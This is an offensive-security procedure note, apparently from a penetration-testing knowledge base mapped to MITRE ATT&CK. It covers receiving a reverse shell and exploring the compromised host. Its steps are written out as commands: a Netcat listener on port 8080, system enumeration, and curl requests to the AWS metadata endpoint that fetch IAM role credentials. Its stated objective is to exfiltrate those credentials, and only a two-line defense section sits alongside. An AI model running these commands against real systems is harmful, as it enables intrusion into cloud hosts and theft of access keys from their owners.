---
tags:
  - reverse-shell
  - discovery
type: procedure
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/Ghostscript]]'
  - '[[tools/Netcat]]'
  - '[[tools/curl]]'
  - '[[tools/Facebook-Messenger]]'
  - '[[tools/bash]]'
  - '[[tools/python]]'
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
commands:
  - '[[commands/postscript-python-reverse-shell]]'
  - '[[commands/whoami]]'
  - '[[commands/ls]]'
  - '[[commands/cat-readme]]'
  - '[[commands/curl-aws-metadata-role]]'
  - '[[commands/curl-aws-credentials]]'
  - '[[commands/postscript-bash-reverse-shell]]'
platforms:
  - AWS
techniques:
  - '[[Command-Line Interface]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Unix Shell]]'
id: 5f5a4728-458d-40df-8a58-313f8b71c141
created_at: '2025-12-11T06:10:32.428Z'
updated_at: '2025-12-11T06:10:32.428Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1059]]'
---
# Receive and Explore Reverse Shell

## Summary

This procedure handles the incoming reverse shell connection and executes commands to discover system details and access sensitive information.

## Description

Upon payload execution, a shell connects back, allowing commands like user identification, file listing, reading internal docs, and querying AWS metadata for credentials.

## Requirements

1. Netcat listener on port 8080
2. Successful payload triggering
3. Network connectivity for shell

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected outbound connections
- Restrict access to metadata services

## Objectives

1. Gain interactive shell access
2. Enumerate files and users
3. Exfiltrate AWS credentials

## Instructions

### Step 1: Receive Shell

**Context**: Listen for and accept the reverse shell connection.

> Use Netcat: nc -lvnp 8080

### Step 2: Explore System

**Command** ([[commands/whoami]]):
```bash
whoami
```

> Expected: deploy

**Command** ([[commands/ls]]):
```bash
ls
```

> Lists directories like app, bin, config.

**Command** ([[commands/cat-readme]]):
```bash
cat README.md
```

> Displays internal repo documentation.

**Command** ([[commands/curl-aws-metadata-role]]):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

> Retrieves role name.

**Command** ([[commands/curl-aws-credentials]]):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
```

> Fetches AccessKeyId, SecretAccessKey, etc.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Discovery]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[Unix Shell]]

## Commands Used

- [[commands/whoami]]
- [[commands/ls]]
- [[commands/cat-readme]]
- [[commands/curl-aws-metadata-role]]
- [[commands/curl-aws-credentials]]

## Tools Used

- [[tools/Netcat]]
- [[tools/curl]]

## Tags

- reverse-shell
- discovery
